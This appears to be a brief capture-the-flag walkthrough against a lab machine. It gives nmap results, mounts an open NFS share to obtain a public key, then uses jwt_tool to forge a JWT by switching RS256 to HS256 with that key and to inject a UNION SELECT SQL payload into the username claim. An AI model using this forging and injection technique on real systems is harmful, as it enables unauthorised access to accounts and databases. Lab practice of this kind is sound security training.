nmap

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
37977/tcp open  unknown
40423/tcp open  unknown
41035/tcp open  unknown
42825/tcp open  unknown
57877/tcp open  unknown
111/udp   open  rpcbind
33779/udp open  unknown
50918/udp open  unknown
57140/udp open  unknown
57739/udp open  unknown
58802/udp open  unknown
```

Trying to mount the share folder through NFS service.

```shell
showmount -e 192.168.216.222
mkdir /tmp/test_folder
sudo mount -t nfs 192.168.216.222:/mnt/share /tmp/test_folder -o nolock
```

Finding a public key but don't know where to use it. 

Next, checking the website. After trying to register many accounts, I find an existing account `brain` the username in the contacts page.



Registering account on the web page and check the session is JWT. We refer to this [article](https://infosecwriteups.com/attacking-json-web-tokens-jwts-d1d51a1e17cb) for testing.

JWT SQL injection

```shell
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
python3 jwt_tool.py <token> -I -pc <Payload claim to tamper with> -pv "<sql command>" -S hs256 -k public.pem
# pc = payload claim to tamper with
# public.pem = public key from NFS
```

Our test payload

```
python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjY1NTg3MzE4fQ.pi_Q8MWnXPtCDhgGcu5yQrjwuPWdgmyHnb7R5eqfBMsAx8UUb-jJ7rvw4bwbqNoucm8STXQweQ_VZwtXka2MCwVMbYSleb4HBa5glk7TdYfq6VATRLXgOU1hKEq1_bJnt5CZhZsBSpiupf2TetA1CeoOAP4Az8h7YAPRNGumJ-rP1z8G3M9uVhfgEJQce4OFNMfLRjFgynPlh9Ekg9ElzdGAUPmv_XjFQnEHLzICW5S6n_8b8siRZFSyNY3A-NcMT-c4D-LqM0WlU_IKdTXoL4vFOc88Yiw0mur51Nokz53xOvEJCEqWndPtOu-uTFKp_e3haNRllEHb3CFvuGi8sepuJil-sW0kZZ8zGtqf4nT4ET4Y6gGAw6qpXoon8ZdC_VfAauuh8gVm11JPbhbXbHsuYSKkdbOOd1p-SemWp9J8-QzB5vyIBql4av8OQ7SiQG9CUUNyg_YDzdPNW3GwzvlTbBArODb4L7BEsOvAsGdTSqimSPI7SWff3I2UdXvo7TfaLXShal_IAnMfh7C96WV8kGHPuRoAd7tikK72vNno2THv1JrvyL4aX3WJ84T3INDzInkNjCGexUk29Q31yZVG4eGZKF7Kbto-rXOryCHfg-JalDmzrOiCh14dDYl6o5YQv4XGFxBke7ucytBi5XO-BZSc8V2NCn9h2v8b88U -I -pc username -pv " ' UNION SELECT 1, 2, 3 --  " -S hs256 -k public.pem
```